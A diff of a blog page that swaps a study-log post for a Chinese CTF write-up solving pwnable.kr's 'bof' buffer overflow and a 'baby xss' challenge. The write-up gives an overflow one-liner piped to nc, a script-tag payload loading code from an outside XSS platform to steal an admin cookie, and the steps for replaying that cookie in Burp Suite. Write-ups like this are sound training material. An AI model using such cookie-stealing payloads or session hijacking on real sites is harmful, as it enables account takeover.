@@ -79,17 +79,23 @@
 
 
 
-<meta name="description" content="今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。">
+<meta name="description" content="pwn-bof &amp;amp; baby xss  —– bof—– 参考： 详细解析ESP寄存器与EBP寄存器: https://blog.csdn.net/u011822516/article/details/20001765   函数栈&amp;amp;EIP、EBP、ESP寄存器的作用: ESP是栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20190913进度">
-<meta property="og:url" content="http://yoursite.com/2019/04/13/20190913进度/index.html">
+<meta property="og:title" content="pwn-bof &amp; baby xss">
+<meta property="og:url" content="http://yoursite.com/2019/09/04/pwn-bof-baby-xss/index.html">
 <meta property="og:site_name" content="Conlonial&#39;s blog">
-<meta property="og:description" content="今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。">
+<meta property="og:description" content="pwn-bof &amp;amp; baby xss  —– bof—– 参考： 详细解析ESP寄存器与EBP寄存器: https://blog.csdn.net/u011822516/article/details/20001765   函数栈&amp;amp;EIP、EBP、ESP寄存器的作用: ESP是栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-13T11:32:18.567Z">
+<meta property="og:image" content="https://i.imgur.com/lT9knru.png">
+<meta property="og:image" content="https://i.imgur.com/q8P9Dgy.png">
+<meta property="og:image" content="https://i.imgur.com/otR6cNk.png">
+<meta property="og:image" content="https://i.imgur.com/TJ6C30N.png">
+<meta property="og:image" content="https://i.imgur.com/l3R8qj0.png">
+<meta property="og:updated_time" content="2019-09-04T08:39:04.322Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="20190913进度">
-<meta name="twitter:description" content="今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。">
+<meta name="twitter:title" content="pwn-bof &amp; baby xss">
+<meta name="twitter:description" content="pwn-bof &amp;amp; baby xss  —– bof—– 参考： 详细解析ESP寄存器与EBP寄存器: https://blog.csdn.net/u011822516/article/details/20001765   函数栈&amp;amp;EIP、EBP、ESP寄存器的作用: ESP是栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最">
+<meta name="twitter:image" content="https://i.imgur.com/lT9knru.png">
 
 
 
@@ -119,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/13/20190913进度/">
+  <link rel="canonical" href="http://yoursite.com/2019/09/04/pwn-bof-baby-xss/">
 
 
 
 
 
-  <title>20190913进度 | Conlonial's blog</title>
+  <title>pwn-bof & baby xss | Conlonial's blog</title>
   
 
 
@@ -232,7 +238,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/20190913进度/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/pwn-bof-baby-xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Conlonial">
@@ -249,7 +255,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">20190913进度</h1>
+          <h1 class="post-title" itemprop="name headline">pwn-bof & baby xss</h1>
         
 
         <div class="post-meta">
@@ -261,8 +267,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-13T19:12:59+08:00">
-                2019-04-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-04T16:37:33+08:00">
+                2019-09-04
               </time>
             
 
@@ -299,7 +305,35 @@
       
 
       
-        <h2 id="今天阅读到了1-4章，了解计算机硬件框架的发展，重点了解了采用PCI-ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程"><a href="#今天阅读到了1-4章，了解计算机硬件框架的发展，重点了解了采用PCI-ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程" class="headerlink" title="今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程"></a>今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程</h2><h2 id="python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。"><a href="#python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。" class="headerlink" title="python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。"></a>python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。</h2>
+        <p><center> pwn-bof &amp; baby xss</center></p>
+<p><center> —– bof—–</center></p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>详细解析ESP寄存器与EBP寄存器:<blockquote>
+<p><a href="https://blog.csdn.net/u011822516/article/details/20001765" target="_blank" rel="noopener">https://blog.csdn.net/u011822516/article/details/20001765</a></p>
+</blockquote>
+</li>
+<li>函数栈&amp;EIP、EBP、ESP寄存器的作用: ESP是栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。<br>EBP是基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<font color="#D2691E">EBP存储着当前函数栈底的地址，栈低通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</font><blockquote>
+<p><a href="https://www.k2zone.cn/?p=1911" target="_blank" rel="noopener">https://www.k2zone.cn/?p=1911</a></p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>转到<a href="http://pwnable.kr/bin/bof" title="Download:" target="_blank" rel="noopener">Download</a> :<a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a> 下载bof文件，拖入IDA-32bits<br>F5编译后查看main函数，跟到func函数后，可知即将a1覆盖为<code>0xCAFEBABE</code> 即可。<br><img src="https://i.imgur.com/lT9knru.png" alt="Imgur"><br>s是ebp-2c,a1是ebp+8h,距离是(2c+8h=52)52，所以要覆盖52个字符.<br>再加上<code>0xCAFEBABE</code>，注意小端输入<br>所以输入<code>(python -c &quot;print &#39;a&#39;*52+&#39;\xbe\xba\xfe\xca&#39;&quot;;cat) | nc pwnable.kr 9000</code><br>ls得到flag文件<br><img src="https://i.imgur.com/q8P9Dgy.png" alt="Imgur"></p>
+<hr>
+<p><center>——babyxss—–</center></p>
+<h3 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>基础知识<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/37455061" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37455061</a></p>
+</blockquote>
+</li>
+<li>MD5截断比较：<blockquote>
+<p><a href="https://www.cnblogs.com/kurokoleung/p/6363845.html" target="_blank" rel="noopener">https://www.cnblogs.com/kurokoleung/p/6363845.html</a><br><a href="http://blog.lnyas.xyz/?p=228" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=228</a></p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>这道题思路是通过XSS获取cookie，再通过burpsuit 抓包上传获得 flag，本身的xss没有任何r绕过，主要是一个md5截断作为验证码，根据参考的MD5截断程序编写babyxs.py，专门用作验证码获取。<br>这道题直接打开xss平台，选择默认模式，将平台生成的代码输入文本框，再输入验证码，就可以在平台得到cookie<br>我输入的代码如下：<code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xssye.com/uc2M&gt;&lt;/sCrIpT&gt;</code><br>得到cookie：<img src="https://i.imgur.com/otR6cNk.png" alt="Imgur"><br>打开burpsuit，在intercept off 下打开 admin.php，再intercept on 进行抓包<br>得到<img src="https://i.imgur.com/TJ6C30N.png" alt="Imgur"><br>将cookie中<code>PHPSESSID=8062ffcea7f0e79ad37339918dc13fe8</code>改为我们得到的<code>token=a9011a0e551f181c1c526881befac44d</code><br>利用repeater发包后得到flag<br><img src="https://i.imgur.com/l3R8qj0.png" alt="Imgur"></p>
+
       
     </div>
     
@@ -323,8 +357,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/12/学习进度/" rel="next" title="学习进度">
-                <i class="fa fa-chevron-left"></i> 学习进度
+              <a href="/2019/08/08/Rapid-Typing-fd-in-pwnable-col/" rel="next" title="Rapid Typing & fd in pwnable & col">
+                <i class="fa fa-chevron-left"></i> Rapid Typing & fd in pwnable & col
               </a>
             
           </div>
@@ -332,10 +366,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/15/20190415学习记录/" rel="prev" title="20190415学习记录">
-                20190415学习记录 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -458,7 +488,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#今天阅读到了1-4章，了解计算机硬件框架的发展，重点了解了采用PCI-ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程"><span class="nav-number">1.</span> <span class="nav-text">今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。"><span class="nav-number">2.</span> <span class="nav-text">python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">1.</span> <span class="nav-text">参考：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析："><span class="nav-number">2.</span> <span class="nav-text">分析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考：-1"><span class="nav-number">3.</span> <span class="nav-text">参考：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析：-1"><span class="nav-number">4.</span> <span class="nav-text">分析：</span></a></li></ol></div>
             
 
           </div>
